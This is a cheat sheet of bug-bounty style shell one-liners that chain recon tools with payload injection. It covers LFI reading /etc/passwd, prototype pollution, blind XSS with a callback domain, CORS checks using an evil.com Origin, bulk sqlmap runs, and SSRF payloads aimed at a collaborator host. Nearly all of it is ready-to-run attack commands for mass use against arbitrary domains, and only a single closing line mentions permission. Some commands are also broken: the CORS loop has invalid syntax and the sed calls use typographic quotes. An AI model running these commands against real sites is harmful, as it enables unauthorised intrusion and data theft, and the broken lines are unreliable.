### Web Application Security Testing Techniques

This guide provides a collection of techniques for web application security testing, including various types of vulnerabilities and how to automate their identification.

**Local File Inclusion (LFI) Vulnerabilities:**

```shell
gau domain.tld | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'
```

**Parameter Pollution:**

```shell
subfinder -d HOST -all -silent | httpx -silent -threads 300 | anew -q FILE.txt && sed 's/$/\/?__proto__[testparam]=exploit\//' FILE.txt | page-fetch -j 'window.testparam == "exploit"? "[VULNERABLE]" : "[NOT VULNERABLE]"' | sed "s/(//g" | sed "s/)//g" | sed "s/JS //g" | grep "VULNERABLE"
```

**Automating Cross-Site Scripting (XSS) Detection:**

```shell
cat test.txt | gf xss | sed ‘s/=.*/=/’ | sed ‘s/URL: //’ | tee testxss.txt ; dalfox file testxss.txt -b yours-xss-hunter-domain(e.g yours.xss.ht)
```

**Cross-Origin Resource Sharing (CORS) Vulnerability Testing:**

```shell
site="https://example.com"; gau "$site" | while read url; do target=$(curl -s -I -H "Origin: https://evil.com" -X GET $url) | if grep 'https://evil.com'; then [Potentional CORS Found]echo $url;else echo Nothing on "$url";fi;done
```

**SQL Injection (SQLi) Detection:**

```shell
findomain -t http://testphp.vulnweb.com -q | httpx -silent | anew | waybackurls | gf sqli >> sqli ; sqlmap -m sqli -batch --random-agent --level 1
```

**Finding Admin Panels:**

```shell
cat domains_list.txt | httpx -ports 80,443,8080,8443 -path /admin -mr "admin"
```

**Directory Listing:**

```shell
feroxbuster -u https://target.com --insecure -d 1 -e -L 4 -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt
```

**Open Redirect Vulnerability Testing:**

```shell
export LHOST="http://localhost"; gau $1 | gf redirect | qsreplace "$LHOST" | xargs -I % -P 25 sh -c 'curl -Is "%" 2>&1 | grep -q "Location: $LHOST" && echo "VULN! %"'
```

**Finding Endpoints in APKs:**

```shell
apktool d app.apk -o uberApk;grep -Phro "(https?://)[\w\.-/]+[\"'\`]" uberApk/ | sed 's#"##g' | anew | grep -v "w3\|android\|github\|http://schemas.android\|google\|http://goo.gl"
```

**Server-Side Request Forgery (SSRF) Detection:**

```shell
findomain -t DOMAIN -q | httpx -silent -threads 1000 | gau |  grep "=" | qsreplace http://YOUR.burpcollaborator.net
```

These techniques can be valuable for identifying and assessing different types of web application vulnerabilities. It's important to use them responsibly, especially when testing against websites or applications that you don't own or have permission to test.
